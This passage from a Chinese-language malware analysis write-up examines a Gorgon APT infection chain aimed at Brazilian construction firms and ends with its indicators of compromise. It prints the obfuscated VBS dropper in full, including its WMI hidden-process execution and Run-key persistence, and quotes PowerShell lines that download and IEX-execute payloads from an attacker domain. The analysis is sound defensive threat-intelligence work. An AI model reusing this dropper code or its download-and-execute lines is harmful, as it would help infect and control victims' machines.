erANDsteal||1,4@#_**CooperANDsteal||,08,121,6@#_**CooperANDsteal||,501,4@#_**CooperANDsteal||,7@#_**CooperANDsteal||,99,101,38,64,6@#_**CooperANDsteal||,101,87,64,901,101,6@#_**CooperANDsteal||,5@#_**CooperANDsteal||,121,38,19,04,6@#_**CooperANDsteal||,99,101,601,89,97,@#_**CooperANDsteal||1,48,85,85,39,901,7@#_**CooperANDsteal||,0@#_**CooperANDsteal||,96,19,23,16,23,05,05,2@#_**CooperANDsteal||,63,95,14,301,0@#_**CooperANDsteal||,501,2@#_**CooperANDsteal||,63,04,23,801,501,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,7@#_**CooperANDsteal||,23,521,6@#_**CooperANDsteal||,101,501,7@#_**CooperANDsteal||,18,54,23,94,23,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,7@#_**CooperANDsteal||,@#_**CooperANDsteal||1,99,54,23,901,@#_**CooperANDsteal||1,99,64,101,801,301,@#_**CooperANDsteal||1,@#_**CooperANDsteal||1,301,23,2@#_**CooperANDsteal||,901,@#_**CooperANDsteal||1,99,54,23,0@#_**CooperANDsteal||,@#_**CooperANDsteal||1,501,6@#_**CooperANDsteal||,99,101,0@#_**CooperANDsteal||,0@#_**CooperANDsteal||,@#_**CooperANDsteal||1,99,54,6@#_**CooperANDsteal||,5@#_**CooperANDsteal||,101,6@#_**CooperANDsteal||,23,16,23,301,0@#_**CooperANDsteal||,501,2@#_**CooperANDsteal||,63,321,23,@#_**CooperANDsteal||1,001(@=HKGhjkghjKGhjkjKGJK$"
f=replace(f,"@#_**CooperANDsteal||","11")
XS="Pow*_$%rsh*_$%ll"
exec(replace(XS,"*_$%","e")+space(1)+StrReverse(f))
exec(replace(XS,"*_$%","e")+space(1)+StrReverse(f))
CurrentDirectory =replace(WScript.ScriptFullName,WScript.ScriptName,"")
sname= wsh.scriptname
startupfolder="C:Users"+CreateObject("WScript.Network").UserName+"AppDataRoaming"

exec(replace(XS,"*_$%","e")+" Set-Item -Path HKCU:SoftwareMicrosoftWindowsCurrentVersionRun -Value "+"'"+startupfolder+ sname+"'")

if CurrentDirectory = startupfolder Then

WScript.Quit()
else

mnb()
End if

sub mnb()

 sSourceFile = CurrentDirectory+sname

sCmd = "cmd /c copy """ &amp; sSourceFile &amp; """ """ &amp; startupfolder &amp; """ /Y"
exec(sCmd)

End sub
Sub exec(gggg)



jk=sHexDecode("536574206f626a574d4953657276696365203d204765744f626a656374282277696e6d676d74733a7b696d706572736f6e6174696f6e4c6576656c3d696d706572736f6e6174657d215c5c2e5c726f6f745c63696d76322229203a20")
jk2=sHexDecode("44696d206f626a574d49536572766963652c6f626a537461727475702c6f626a50726f636573732c6f626a436f6e6669672c696e7450726f6365737349442c696e7452657475726e203a20")


    ExecuteGlobal _ 
 sHexDecode("4f7074696f6e204578706c696369743a20") &amp; _
    sHexDecode("53756220657865632867676767293a20") &amp; _
 jk2 &amp; _
 jk &amp; _
 sHexDecode("536574206f626a53746172747570203d206f626a574d49536572766963652e476574282257696e33325f50726f636573735374617274757022293a20") &amp; _
 sHexDecode("536574206f626a436f6e666967203d206f626a537461727475702e537061776e496e7374616e63655f3a20") &amp; _
    sHexDecode("6f626a436f6e6669672e53686f7757696e646f77203d2030203a20") &amp; _
 sHexDecode("536574206f626a50726f63657373203d206f626a574d49536572766963652e476574282257696e33325f50726f636573732229203a20") &amp; _
 sHexDecode("696e7452657475726e203d206f626a50726f636573732e43726561746528676767672c204e756c6c2c206f626a436f6e6669672c20696e7450726f63657373494429203a20") &amp; _
    sHexDecode("456e64205375623a")



 End sub
Public Function sHexDecode(sData) 
 Dim sOutString 
 Dim sTmpChar 
 For iChar = 1 To Len(sData) Step 2
sTmpChar = Chr("&amp;H" &amp; Mid(sData, iChar, 2))
sOutString = sOutString &amp; sTmpChar
Next 
 sHexDecode = sOutString
End Function

```

该段VBS代码较长，我们在编辑器中可以看到，该段vbs首先会对f变量进行两次赋值，然后通过

f = replace(f,”@#_**CooperANDsteal||”,”11”) 的操作将中间的混淆值去掉

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ccb186d8f2bad5f2.png)

所以我们直接在调试器中将两次f的值拼接起来，然后手动替换。

替换之后F的值如下，可以看出来是一段加密的字节流

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017292affc00c2a176.png)

接下来程序通过replace解码出XS的powershell，然后执行两次通过StrReverse翻转后的f变量。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b6dbf7800c7fbaa0.png)

至于f翻转后执行了什么，我们后面在看，我们先把这个vbs代码看完。

接下来程序通过

CurrentDirectory =replace(WScript.ScriptFullName,WScript.ScriptName,””)

将ScriptFullName (当前运行脚本的完整路径) 替换为WScript.ScriptName(当前运行脚本的文件名)

然后通过

startupfolder=”C:Users”+CreateObject(“WScript.Network”).UserName+”AppDataRoaming”

获取当前计算机的启动路径。

然后程序通过以if判断当前的路径是否在启动路径中，如果在启动路径中，则说明该脚本已经成功运行了，那么则退出当前进程防止多开被发现。相反，如果不在启动路径中，则通过mnb函数将该文件copy到启动路径中。

[![](https://p3.ssl.qhimg.com/t01e14b489048bc8838.png)](https://p3.ssl.qhimg.com/t01e14b489048bc8838.png)

最后程序多次调用sHexDecode函数

[![](https://p1.ssl.qhimg.com/t0141a6738d1a71dfac.png)](https://p1.ssl.qhimg.com/t0141a6738d1a71dfac.png)

这里静态看就很慢了，此时我们可以对vbs脚本进行调试。

调试的话一种是官方推荐的VS调试，一种是自己写一些简单的VBS脚本赋值分析。我们可以根据不同的情况选择不同的调试方法，我们先来尝试一下print大法。

我们首先在桌面新建一个debug.vbs和1.txt

然后再debug.vbs中键入sHexDecode函数的内容：

[![](https://p3.ssl.qhimg.com/t014baf374faf5c3d6e.png)](https://p3.ssl.qhimg.com/t014baf374faf5c3d6e.png)

我这里在opentextfile函数给的参数是8，表示追加写入，因为我们会多次调用和写入。

此时我们运行程序，程序就会弹框显示，并且将值写入到1.txt文档中。

[![](https://p1.ssl.qhimg.com/t01ce1f5e69b1037be6.png)](https://p1.ssl.qhimg.com/t01ce1f5e69b1037be6.png)

同样的，我们再解码jk2：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b5d66e916ccfb90e.png)

最后，将所有数据解码之后可以看到，又是一段vbs代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014fb48935332041ed.png)

格式化之后大概如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ef5673c81e5db0ed.png)

就是通过com组件启动指定进程。

所以该VBS的功能是：
1. 替换、翻转一个大字节流f
1. 通过powershell执行f
1. 将自身移动到启动项文件夹下。
所以这样看来，该vbs的关键代码在上面执行的两行powershell脚本中。接下来我们来分析这个powershell指令。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0181a57ed904a1f71f.png)

### <a class="reference-link" name="powershell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>powershell代码分析

由于在vbs代码中只是对f变量进行了一个简单的翻转，然后就调用powershell执行，所以我们直接通过python将f变量进行翻转再写入到code.txt文件中：

[![](https://p5.ssl.qhimg.com/t0140cee7c8e8edb55a.png)](https://p5.ssl.qhimg.com/t0140cee7c8e8edb55a.png)

这样powershell指令就比较一目了然了：

[![](https://p1.ssl.qhimg.com/t01f98f311aa103770c.png)](https://p1.ssl.qhimg.com/t01f98f311aa103770c.png)

我们可以看到最后的IEX指令，熟悉powershell就知道这是执行指令，对于此类powershell脚本的解码方式非常简单，就是直接将IEX指令更换为echo指令即可。

[![](https://p5.ssl.qhimg.com/t013aacd3506710c22c.png)](https://p5.ssl.qhimg.com/t013aacd3506710c22c.png)

然后我们将该code.txt更改为code.ps1，并且启动powershell 执行该ps1脚本：

[![](https://p2.ssl.qhimg.com/t014874acd4fa488ed9.png)](https://p2.ssl.qhimg.com/t014874acd4fa488ed9.png)

为了有更好的可视化，我们还是使用管道将其进行输出。

[![](https://p4.ssl.qhimg.com/t01fcf9ba03bf8a1c98.png)](https://p4.ssl.qhimg.com/t01fcf9ba03bf8a1c98.png)

成功运行后，桌面将会出现我们需要powershellCode.ps1

格式化之后显示如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f45dd1176eedee87.png)

在该段代码中，程序首先会通过

do `{`$ping = test-connection -comp google.com -count 1 -Quiet`}` until ($ping);

的方式循环请求google.com 如果成功请求则继续，如果请求失败则退出。

然后程序使用

$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);

命令指定请求协议，在本样本中使用的是TLS1.2协议进行网络请求。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01acd5d8f5da2bb8d0.png)

然后通过

[void] [System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.VisualBasic’);

反射加载执行代码

执行的代码是

$fj=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’Dow$**$loadStri$**$g’.replace(‘$_$’,’n’),[Microsoft.VisualBasic.CallType]::Method,’hxxps://gritodopovo.com.br/natalidade/RunnPNovaStartupR.jpg’)|IEX;

该段代码首先通过vb的方法请求并下载hxxps://gritodopovo.com.br/natalidade/RunnPNovaStartupR.jpg到本地，然后通过IEX执行该jpg文件。

同样的，接着通过

[Byte[]]$toto=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’Dow$**$loadStri$**$g’.replace(‘$_$’,’n’),[Microsoft.VisualBasic.CallType]::Method,’hxxps://gritodopovo.com.br/natalidade/darkspam.mp3’).replace(‘..’,’0x’)|IEX;

下载hxxps://gritodopovo.com.br/natalidade/darkspam.mp3到本地，并且将..替换为0x并通过IEX执行。

### <a class="reference-link" name="RunnPNovaStartupR.jpg"></a>RunnPNovaStartupR.jpg

同样的方法，我们请求该地址，并且尝试保存jpg的返回值

[![](https://p0.ssl.qhimg.com/t01ae14313936c95dd7.png)](https://p0.ssl.qhimg.com/t01ae14313936c95dd7.png)

保存的jpg返回值如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010789e6a542c1c98a.png)

这里很明显又是一个powershell的脚本。

在该脚本中，程序首先是定义了一个名为Get-DecompressedByteArray的function，这里只是方法定义，还未调用，我们暂时可以不用看。

接着程序通过

$t0=’DEX’.replace(‘D’,’I’);

将$t0赋值为IEX

然后执行

sal g $t0;

给$t0添加别名：g方便之后调用

然后声明了[Byte[]]$Cli 赋值一个超长的串：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f496a06039944f82.png)

滑到最后可以看到，程序将这里的@|@替换为0x然后通过g，也就是IEX进行调用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018e0860e92028d2ef.png)

而且我们可以看到，将这里的@|@替换之后，该段数据的头部二进制流将为1F 8B 08 00

根据经验，我们可以得知该文件流将会是一个zip压缩包。

[![](https://p1.ssl.qhimg.com/t0172d33f74b6352547.png)](https://p1.ssl.qhimg.com/t0172d33f74b6352547.png)

我们手动对这段数据进行替换，首先将所有的@|@替换为空字符

然后将逗号(，) 替换为空格：

[![](https://p4.ssl.qhimg.com/t01206114bf3ff8cb5b.png)](https://p4.ssl.qhimg.com/t01206114bf3ff8cb5b.png)

替换之后复制这一大段数据，然后在Winhex中先ctrl + n新建一个1字节大小的文件：

[![](https://p3.ssl.qhimg.com/t01bc1d72f4754060a4.png)](https://p3.ssl.qhimg.com/t01bc1d72f4754060a4.png)

文件新建后，在第一个字节流按Ctrl +B 复制二进制字节流，在弹出的对话框中选择Ascii Hex

[![](https://p5.ssl.qhimg.com/t01b1e623979e5c6ba5.png)](https://p5.ssl.qhimg.com/t01b1e623979e5c6ba5.png)

确定之后即可成功保存：

[![](https://p0.ssl.qhimg.com/t01d5620a84b7fdf820.png)](https://p0.ssl.qhimg.com/t01d5620a84b7fdf820.png)

保存之后修改为zip后缀并通过压缩软件解压

[![](https://p4.ssl.qhimg.com/t01bd23f51543573aad.png)](https://p4.ssl.qhimg.com/t01bd23f51543573aad.png)

将这个noname文件解压出来并放入winhex中可以看到是一个PE文件

[![](https://p5.ssl.qhimg.com/t01dbc7209baf755eb0.png)](https://p5.ssl.qhimg.com/t01dbc7209baf755eb0.png)

现在这个RunnPnovaStartupR.jpg的功能就很清晰了。

该jpg文件本质是一个powershell脚本文件，由于在上一层是通过IEX执行该jpg文件，所以该文件中的powershell代码将会正常执行。powershell代码执行之后，会通过字符串替换的方式解码一个zip文件，然后通过powershell系统方法对该字节流进行解压缩得到一个PE然后反射加载。

[![](https://p1.ssl.qhimg.com/t01117dbfb5fc5a828e.png)](https://p1.ssl.qhimg.com/t01117dbfb5fc5a828e.png)

由于该PE与我们之前分析过的类型不同，属于新的一种PE分析，我们将在下一节中详细讲解该PE的分析方法。

### <a class="reference-link" name="darkspam.mp3"></a>darkspam.mp3

darkspam.mp3文件内容如下，和我们推算的一致，是一个PE文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a7bfa2060d890249.png)

同样的，我们把这段字节流保存到Winhex中然后转存为PE文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01de381a229a3a2d2d.png)

然后通过exeinfo加载该文件可以看到是一个Delphi语言编写的木马。关于该类木马的分析我们也在后面的文章中进行介绍。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a179bf93b7472ce1.png)

至此，本次非PE部分的分析就完全结束了。



## 0x03 总结

通过本次分析可以看到，涉及的样本和请求地址还是比较多的。现在做一个简单的整理。

首先是原始文件md5：85e12cab0cf1f599007e693e66f42de8

用于模板注入文件md5：03E26C270201B736995056271F566979

模板注入的地址：hxxps://gritodopovo.com.br/natalidade/new.wiz

第一个vbs的下载地址：hxxps://gritodopovo.com.br/natalidade/macro02.mp3

payload1下载地址：hxxps://gritodopovo.com.br/natalidade/RunnPNovaStartupR.jpg

payload2下载地址：hxxps://gritodopovo.com.br/natalidade/darkspam.mp3

我们可以看到，这里的下载地址都在主域名gritodopovo.com.br的natalidade路径下。

我们对该主域名进行查询可以看到该域名已经和APT组织Gorgon关联起来了：

[https://ti.qianxin.com/v2/search?type=domain&amp;value=gritodopovo.com.br](https://ti.qianxin.com/v2/search?type=domain&amp;value=gritodopovo.com.br)

[![](https://p5.ssl.qhimg.com/t0112fe50f3d68b9913.png)](https://p5.ssl.qhimg.com/t0112fe50f3d68b9913.png)

结合我们在最开始分析到的内容，该样本疑似针对巴西建筑行业的攻击，也比较符合Gorgon的攻击目标。

此外，在去年年底的时候，笔者分析了一起关于Gorgon针对巴西公寓的攻击:[https://www.anquanke.com/post/id/204023](https://www.anquanke.com/post/id/204023)

通过对比两次攻击的样本和攻击手法，可以发现有不少共同之处，所以基本可以确定，该样本属于Gorgon的攻击样本，攻击目标是巴西的建筑/与建筑相关的行业。

且从之前的攻击中我们可以看到，样本在最后是下载并执行了两个njrat远控木马，但是很明显在本样本中，最后加载的样本和之前有所不同，这是个好消息，说明我们掌握了Gorgon的一个新木马，我们可以收集这些信息，逐步完善对Gorgon的分析。
